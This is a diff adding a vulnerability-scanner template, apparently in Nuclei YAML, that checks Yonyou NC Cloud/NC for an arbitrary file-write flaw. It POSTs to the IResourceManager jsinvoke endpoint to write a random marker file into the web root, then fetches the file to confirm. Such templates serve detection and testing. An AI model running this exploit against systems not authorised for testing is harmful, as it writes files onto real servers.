@@ -1,0 +1,52 @@
+id: poc-yaml-yongyou-nc-cloud-iresourcemanager-file-upload
+info:
+  name: 用友NC Cloud/NC IResourceManager 任意文件写入漏洞
+  author: ProjectDiscoveryAI
+  severity: critical
+  tags: file-upload
+
+variables:
+  random_string: '{{rand_text_alphanumeric(8)}}'
+  file_hash: '{{md5(random_string)}}'
+
+flow: |
+  http(1) && http(2)
+
+http:
+  - id: file-upload
+    method: POST
+    path:
+      - "{{BaseURL}}/uapjs/jsinvoke/?action=invoke"
+    headers:
+      Content-Type: application/json
+    body: |
+      {
+        "serviceName": "uap.framework.rc.itf.IResourceManager",
+        "methodName": "add",
+        "parameterTypes": ["java.lang.String","java.lang.String"],
+        "parameters": ["{{file_hash}}","webappsapps/nc_web/{{random_string}}.txt"]
+      }
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+
+  - id: verify-upload
+    method: GET
+    path:
+      - "{{BaseURL}}/webappsapps/nc_web/{{random_string}}.txt"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "{{file_hash}}"
+      - type: word
+        part: body
+        words:
+          - "<"
+        negative: true
